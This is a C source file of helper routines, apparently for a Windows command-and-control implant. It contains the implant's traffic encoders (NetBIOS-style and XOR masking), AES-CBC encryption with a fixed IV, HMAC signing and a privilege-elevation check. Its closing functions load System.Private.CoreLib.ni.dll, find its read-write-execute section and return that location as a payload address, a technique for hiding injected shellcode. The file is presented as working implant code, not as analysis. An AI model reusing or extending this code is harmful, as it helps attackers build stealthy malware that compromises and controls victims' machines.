#include "Util.h"
#include "Config.h"
#include <openssl/aes.h>
#pragma warning(disable:4996)

uint16_t Readshort(uint8_t* b) {
    return (uint16_t)b[0] << 8 | (uint16_t)b[1];
}


bool IsHighPriv() {
    // 在此处编写判断是否具有高权限的逻辑

    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD size;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("Failed to open process token.\n");
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        printf("Failed to get token information.\n");
        return FALSE;
    }

    CloseHandle(hToken);

    return elevation.TokenIsElevated;
}

uint32_t bigEndianUint32(uint8_t b[4]) {
    return ((uint32_t)b[0] << 24) | ((uint32_t)b[1] << 16) | ((uint32_t)b[2] << 8) | (uint32_t)b[3];
}


void PutUint32BigEndian(uint8_t* b, uint32_t v) {
    b[0] = (uint8_t)(v >> 24);
    b[1] = (uint8_t)(v >> 16);
    b[2] = (uint8_t)(v >> 8);
    b[3] = (uint8_t)v;
}

uint8_t* WriteInt(size_t nInt, uint8_t* bBytes) {
    PutUint32BigEndian(bBytes, nInt);
    return bBytes;
}
void PutUint16BigEndian(uint8_t* bytes, uint16_t value) {
    bytes[0] = (value >> 8) & 0xFF;
    bytes[1] = value & 0xFF;
}

unsigned char* RandomAESKey(unsigned char* aesKey, size_t keyLength) {
    // Generate random bytes for AES key
    RAND_bytes(aesKey, keyLength);

     //Output generated AES key
    //printf("GlobalKey Key: ");
    /*for (size_t i = 0; i < keyLength; ++i) {
        printf("0x%02x, ", aesKey[i]);
    }
    printf("\n");
    for (size_t i = 0; i < keyLength; ++i) {
        printf("%d, ", aesKey[i]);
    }
    printf("\n");*/
    return aesKey;
}
// 生成随机字母'A'到'Z'
wchar_t getRandomWideLetter() {
    return L'A' + rand() % 26; // 生成随机字母'A'到'Z'
}

//生成随机数字
int GenerateEvenRandomInt(int min, int max) {
    srand((unsigned int)time(NULL)); // 使用当前时间作为随机数种子

    int randomInt = rand() % (max - min + 1) + min; // 生成 min 到 max 之间的随机数
    if (randomInt % 2 != 0) { // 如果随机数为奇数，则加一使其成为偶数
        randomInt++;
    }

    return randomInt;
}

uint8_t* ConByte(uint8_t** arrays, size_t* sizes, size_t numArrays) {
    size_t totalSize = 0;

    // 计算所有数组的总大小
    for (size_t i = 0; i < numArrays; ++i) {
        totalSize += sizes[i];
    }

    uint8_t* result = (uint8_t*)malloc(totalSize); // 分配足够的内存来存放连接后的数组

    if (result == NULL) {
        // 内存分配失败
        return NULL;
    }

    size_t offset = 0;

    // 复制每个数组的内容到结果中
    for (size_t i = 0; i < numArrays; ++i) {
        memcpy(result + offset, arrays[i], sizes[i]);
        offset += sizes[i];
    }

    return result;
}



char* base64Encode(unsigned char* data, size_t inputLength) {
    BIO* bio, * b64;
    BUF_MEM* bufferPtr;
    b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);

    BIO_write(bio, data, inputLength);
    BIO_flush(bio);

    BIO_get_mem_ptr(bio, &bufferPtr);
    BIO_set_close(bio, BIO_NOCLOSE);
    BIO_free_all(bio);

    char* encodedData = (char*)malloc(bufferPtr->length + 1);
    if (!encodedData) {
        fprintf(stderr, "内存分配失败\n");
        return NULL;
    }

    memcpy(encodedData, bufferPtr->data, bufferPtr->length);
    encodedData[bufferPtr->length] = '\0';

    return encodedData;
}

unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, unsigned char key, size_t* encoded_length) {
    if (data == NULL || data_length == 0) {
        return NULL;
    }

    unsigned char* result = (unsigned char*)malloc(2 * data_length * sizeof(unsigned char));
    if (result == NULL) {
        // Handle memory allocation failure
        return NULL;
    }

    *encoded_length = 0;

    for (size_t i = 0; i < data_length; ++i) {
        unsigned char value = data[i];
        unsigned char buf[2];

        buf[0] = (value >> 4) + key;
        buf[1] = (value & 0xF) + key;

        result[(*encoded_length)++] = buf[0];
        result[(*encoded_length)++] = buf[1];
    }
    /*printf("NetbiosEncode : \n");
    for (size_t i = 0; i < 2 * data_length * sizeof(unsigned char); ++i) {
        printf("%d ", result[i]);
    }
    printf("\n");*/

    return result;
}
unsigned char* NetbiosDecode(unsigned char* data, int data_length, unsigned char key ,size_t* NetbiosDecodelen) {
    for (int i = 0; i < data_length; i += 2) {
        data[i / 2] = ((data[i] - key) << 4) + ((data[i + 1] - key) & 0xf);
    }
    *NetbiosDecodelen = data_length / 2;
    return data;
}
void XOR(unsigned char* data, unsigned char* key, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key[i % 4]; // Assuming the key is 4 bytes, XOR operation
    }
}

unsigned char* MaskEncode(unsigned char* data, size_t data_length , size_t* codelen) {
    unsigned char* result = (unsigned char*)malloc((data_length + 4) * sizeof(unsigned char*));
    if (result == NULL) {
        // Handle memory allocation failure
        return NULL;
    }

    // Generate random key
    unsigned char key[4];
    for (int i = 0; i < 4; ++i) {
        key[i] = rand() & 0xFF; // Assuming the key is 4 bytes
    }

    // Copy the key to the beginning of the result buffer
    memcpy(result, key, 4);

    // Perform XOR operation on the data using the key
    XOR(data, key, data_length);

    // Copy the XORed data to the result buffer after the key
    memcpy(result + 4, data, data_length);
    result[data_length + 4] = '\0';

   // printf("MaskEncode : \n");
   /* for (size_t i = 0; i < data_length + 4; ++i) {
    printf("%d ", result[i]);
    }
    printf("\n");*/
    *codelen = data_length + 4;
    return result;
}
// MaskDecode function (assuming XOR operation as in the Go code)
unsigned char* MaskDecode(unsigned char* data, size_t data_length, unsigned char* key, int key_length) {
    for (int i = 0; i < data_length; ++i) {
        data[i] ^= key[i % key_length];
    }
    return data;
}
//unsigned char* PaddingWithA(const unsigned char* rawData, size_t rawDataLen, size_t* paddedDataLen) {
//    size_t blockSize = AES_BLOCK_SIZE;
//    size_t paddedLen = ((rawDataLen + blockSize - 1) / blockSize) * blockSize;
//    unsigned char* paddedData = (unsigned char*)malloc(paddedLen);
//    if (paddedData == NULL) {
//        fprintf(stderr, "Memory allocation failed\n");
//        return NULL;
//    }
//
//    memcpy(paddedData, rawData, rawDataLen);
//
//    for (size_t i = rawDataLen; i < paddedLen; i++) {
//        paddedData[i] = 'A'; // Fill with 'A'
//    }
//
//    *paddedDataLen = paddedLen;
//    return paddedData;
//}
unsigned char* PaddingWithA(unsigned char* rawData, size_t len, size_t* paddedDataLen) {
    size_t step = 16;
    size_t pad = len % step;
    size_t padSize = step - pad;
    unsigned char* newBuf = malloc(len + padSize + 1); // Extra byte for '\0'
    if (newBuf == NULL) {
        fprintf(stderr, "内存分配失败\n");
        return NULL;
    }
    memcpy(newBuf, rawData, len);
    memset(newBuf + len, 'A', padSize);
    newBuf[len + padSize] = '\0';
    *paddedDataLen = len + padSize;
    return newBuf;
}


unsigned char* AesCBCEncrypt(unsigned char* rawData, unsigned char* key,size_t len, size_t* encryptedDataLen) {
    AES_KEY aesKey;
    unsigned char IVA[AES_BLOCK_SIZE];
    memcpy(IVA, IV, AES_BLOCK_SIZE);
    if (AES_set_encrypt_key(key, 128, &aesKey) != 0) {
        fprintf(stderr, "AES_set_encrypt_key error\n");
        return NULL;
    }
    size_t blockSize = 16; // AES block size is 16 bytes
    size_t paddedDataLen;
    unsigned char* paddedData = PaddingWithA(rawData, len,&paddedDataLen);
    if (paddedData == NULL) {
        return NULL;
    }
    size_t paddedLen = paddedDataLen;
    size_t cipherTextLen = blockSize + paddedLen;
    unsigned char* paddedLenDATA = malloc(paddedLen + 1); // Extra byte for '\0'
    if (paddedLenDATA == NULL) {
        fprintf(stderr, "内存分配失败\n");
        free(paddedData);
        return NULL;
    }
    AES_cbc_encrypt(paddedData, paddedLenDATA, paddedLen, &aesKey, IVA, AES_ENCRYPT);
    unsigned char ADD[16] = { 0X00,0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 };
    unsigned char* cipherText = malloc(cipherTextLen + 1);
    memcpy(cipherText, ADD ,16);
    memcpy(cipherText+16, paddedLenDATA, paddedLen);
    *encryptedDataLen = paddedLen+16;
    return cipherText;
}

unsigned char* AesCBCDecrypt(unsigned char* encryptData, unsigned char* key, size_t dataLen , size_t* decryptAES_CBCdatalen) {
    AES_KEY aesKey;
    unsigned char IVA[AES_BLOCK_SIZE];

    memcpy(IVA, IV, AES_BLOCK_SIZE);
    if (AES_set_decrypt_key(key, 128, &aesKey) < 0) {
        fprintf(stderr, "Failed to set AES decryption key\n");
        return NULL;
    }

    if (dataLen % AES_BLOCK_SIZE != 0) {
        fprintf(stderr, "Ciphertext is not a multiple of the block size\n");
        return NULL;
    }

    unsigned char* decryptData = (unsigned char*)malloc(dataLen);
    if (decryptData == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    AES_cbc_encrypt(encryptData, decryptData, dataLen, &aesKey, IVA, AES_DECRYPT);
    unsigned long errCode = ERR_get_error();
    if (errCode != 0) {
        char errStr[256];
        ERR_error_string(errCode, errStr);
        fprintf(stderr, "OpenSSL error: %s\n", errStr);
    }
   /* printf("AESCBCdecryptData %d  \n", dataLen);
    for (int i = 0; i < dataLen; i++) {
        printf("%d ", decryptData[i]);
    }*/
    *decryptAES_CBCdatalen = dataLen;
    
    return decryptData;
    
}

// 定义函数进行字符集转换
unsigned char* CodepageToUTF8(unsigned char* input, size_t inputLen, size_t* outputLen) {
    int utf8Len = MultiByteToWideChar(CP_ACP, 0, (LPCSTR)input, inputLen, NULL, 0);
    if (utf8Len == 0) {
        printf("Error in MultiByteToWideChar: %d\n", GetLastError());
        return NULL;
    }

    wchar_t* utf16Buffer = (wchar_t*)malloc((utf8Len + 1) * sizeof(wchar_t));
    if (utf16Buffer == NULL) {
        printf("Memory allocation error.\n");
        return NULL;
    }

    MultiByteToWideChar(CP_ACP, 0, (LPCSTR)input, inputLen, utf16Buffer, utf8Len);

    int utf8OutputLen = WideCharToMultiByte(CP_UTF8, 0, utf16Buffer, utf8Len, NULL, 0, NULL, NULL);
    if (utf8OutputLen == 0) {
        printf("Error in WideCharToMultiByte: %d\n", GetLastError());
        free(utf16Buffer);
        return NULL;
    }

    unsigned char* utf8Buffer = (unsigned char*)malloc(utf8OutputLen + 1);
    if (utf8Buffer == NULL) {
        printf("Memory allocation error.\n");
        free(utf16Buffer);
        return NULL;
    }

    WideCharToMultiByte(CP_UTF8, 0, utf16Buffer, utf8Len, (LPSTR)utf8Buffer, utf8OutputLen, NULL, NULL);
    utf8Buffer[utf8OutputLen] = '\0';

    free(utf16Buffer);
    *outputLen = utf8OutputLen;
    return utf8Buffer;
}

#define HMAC_KEY_LENGTH 16  // HMAC Key的长度
extern unsigned char Hmackey[16];
//extern unsigned char Hmackey[16];
#define HMAC_KEY_LENGTH 16 // Assuming HMAC key length is 16 bytes
unsigned char* HMkey(const unsigned char* encryptedBytes, size_t encryptedBytesLen) {
    if (encryptedBytes == NULL || encryptedBytesLen == 0) {
        return NULL;
    }

    unsigned char hmac_result[EVP_MAX_MD_SIZE];
    unsigned int hmac_len = 0;

    HMAC_CTX* hmac_ctx = HMAC_CTX_new();
    if (hmac_ctx == NULL) {
        fprintf(stderr, "Failed to create HMAC context\n");
        return NULL;
    }

    if (!HMAC_Init_ex(hmac_ctx, Hmackey, HMAC_KEY_LENGTH, EVP_sha256(), NULL)) {
        fprintf(stderr, "HMAC initialization failed\n");
        HMAC_CTX_free(hmac_ctx);
        return NULL;
    }

    if (!HMAC_Update(hmac_ctx, encryptedBytes, encryptedBytesLen)) {
        fprintf(stderr, "HMAC update failed\n");
        HMAC_CTX_free(hmac_ctx);
        return NULL;
    }

    if (!HMAC_Final(hmac_ctx, hmac_result, &hmac_len)) {
        fprintf(stderr, "HMAC finalization failed\n");
        HMAC_CTX_free(hmac_ctx);
        return NULL;
    }

    HMAC_CTX_free(hmac_ctx);

    // Return only the first 16 bytes of the HMAC result
    unsigned char* truncated_hmac = (unsigned char*)malloc(16 * sizeof(unsigned char));
    if (truncated_hmac == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(truncated_hmac, hmac_result, 16);
    return truncated_hmac;
}
unsigned char* intToUnsignedChar(int value) {
    unsigned char* result = (unsigned char*)malloc(sizeof(int)); // 分配与整数大小相同的空间
    if (result == NULL) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }

    // 使用位运算将整数拆分成字节并存储在数组中
    for (int i = 0; i < sizeof(int); ++i) {
        result[i] = (value >> (8 * i)) & 0xFF;
    }

    return result;
}

unsigned char* str_replace_all(unsigned char* str, unsigned char* find, unsigned char* replace) {
    size_t find_len = strlen(find);
    size_t replace_len = strlen(replace);
    size_t str_len = strlen(str);

    // 计算替换后字符串的长度
    size_t result_len = 0;
    unsigned char* ptr = str;
    while ((ptr = strstr(ptr, find)) != NULL) {
        result_len += replace_len;
        ptr += find_len;
    }

    // 计算替换后字符串的实际长度
    size_t result_actual_len = str_len + result_len;

    // 分配足够的内存空间来存储替换后的字符串
    unsigned char* result = (unsigned char*)malloc((result_actual_len + 1) * sizeof(unsigned char));
    if (result == NULL) {
        return NULL; // 内存分配失败
    }

    unsigned char* res_ptr = result;
    ptr = str;
    while (*ptr) {
        if (strstr(ptr, find) == ptr) {
            strcpy(res_ptr, replace);
            res_ptr += replace_len;
            ptr += find_len;
        }
        else {
            *res_ptr++ = *ptr++;
        }
    }
    *res_ptr = '\0';

    return result;
}


DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                //printf("Base Address: %p\n", (void*)baseAddress);
                //printf("Section Offset: %p\n", (void*)sectionOffset);
                //printf("Size of section: %lu\n", sectionSize);
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                printf("Size of section: %lu\n", sectionSize);
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

LPVOID RWXaddress() {

    HMODULE hDll = LoadLibraryW(L"System.Private.CoreLib.ni.dll");
    if (hDll == NULL) {
        DWORD error = GetLastError();
        LPVOID lpMsgBuf;
        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            error,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&lpMsgBuf,
            0,
            NULL
        );

        // Print error message
        wprintf(L"Failed to load the targeted DLL: %s\n", (wchar_t*)lpMsgBuf);

        // Free resources
        LocalFree(lpMsgBuf);
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(
        GetCurrentProcess(),
        hDll,
        &moduleInfo,
        sizeof(MODULEINFO))
        ) {
        // fail
        printf("Failed to get module info\n");
    }

    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);

    LPVOID payloadAddress = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);
    return payloadAddress;
}